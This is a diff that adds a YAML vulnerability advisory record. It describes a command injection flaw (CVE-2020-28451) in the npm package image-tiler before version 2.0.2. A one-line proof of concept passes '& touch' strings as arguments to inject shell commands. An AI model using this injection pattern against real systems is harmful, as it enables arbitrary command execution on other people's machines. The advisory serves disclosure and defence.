@@ -1,0 +1,35 @@
+---
+- id: snykio:npm:image-tiler:1051029
+  title: Command Injection
+  description: |
+    [image-tiler][1] is a package that creates zoom tile pyramids from a
+    large image. There are other packages very similar to this one, but none
+    did exactly what I needed, so I made mine.
+
+    Affected versions of this package are vulnerable to Command Injection.
+
+    ### PoC   {#poc}
+
+        var tile = require("image-tiler").tile;
+        var tilePromise = tile("& touch 1112","& touch 222","& touch 33",{invertZoom:true});
+
+
+
+    [1]: https://github.com/MrP/image-tiler
+  affected_package: image-tiler
+  vulnerable_versions:
+  - "<2.0.2"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-28451
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-12-14
+  created_date: 2021-01-06
+  last_modified_date: 2021-01-06
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/MrP/image-tiler/commit/f4a0b13a4bf43655fc4013e04bbceaf77aecbeb8
+  source_url: https://snyk.io/vuln/SNYK-JS-IMAGETILER-1051029
